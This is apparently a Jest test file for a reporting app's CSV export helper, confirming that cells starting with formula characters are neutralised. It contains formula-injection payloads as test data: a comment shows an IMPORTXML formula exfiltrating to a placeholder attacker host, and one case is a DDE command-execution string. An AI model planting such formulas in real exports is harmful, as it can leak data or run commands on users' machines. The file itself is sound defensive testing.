'use strict';

const csv = require('../../src/helpers/csv');

/**
 * QA-5 RPT-02: a client/order name or free-text field (client self-service
 * forms, dispute/amendment reasons, comments) can carry attacker-chosen text
 * all the way into a report CSV export. Excel/Sheets/LibreOffice evaluate a
 * cell starting with =, +, -, @, or tab/CR as a formula on open, so a client
 * name like '=IMPORTXML("http://attacker/",...)' run through a staff
 * member's spreadsheet can exfiltrate other cells in that row.
 */
describe('csv.stream neutralizes spreadsheet formula injection (QA-5 RPT-02)', () => {
  function fakeRes() {
    const res = { headers: {}, sent: null };
    res.setHeader = (k, v) => { res.headers[k] = v; };
    res.send = (body) => { res.sent = body; };
    return res;
  }

  function firstDataLine(value) {
    const res = fakeRes();
    csv.stream(res, 'export.csv', ['name'], [{ name: value }]);
    return res.sent.split('\r\n')[1];
  }

  // No comma/quote/CR/LF of their own, so the only transformation expected
  // is the leading single-quote neutralization (no extra CSV quoting).
  const DANGEROUS_VALUES = ['=1+1', "=cmd|'/c calc'!A1", '+1+1', '-1+1', '@SUM(1+1)'];

  it.each(DANGEROUS_VALUES)('prefixes "%s" with a quote so spreadsheets treat it as text', (value) => {
    expect(firstDataLine(value)).toBe(`'${value}`);
  });

  it('neutralizes a leading tab', () => {
    expect(firstDataLine('\t=1+1')).toBe("'\t=1+1");
  });

  it('neutralizes a leading formula AND correctly CSV-quotes a value containing a comma', () => {
    expect(firstDataLine('=1,2')).toBe('"\'=1,2"');
  });

  it('neutralizes a leading carriage return, which also forces CSV quoting', () => {
    expect(firstDataLine('\r=1+1')).toBe('"\'\r=1+1"');
  });

  const SAFE_VALUES = ['Ordinary Trading Co.', 'Client -inline dash is fine mid-string', '', 'john@example.com', 'A-1 Warehouse'];

  it.each(SAFE_VALUES)('leaves "%s" unchanged', (value) => {
    expect(firstDataLine(value)).toBe(value);
  });
});
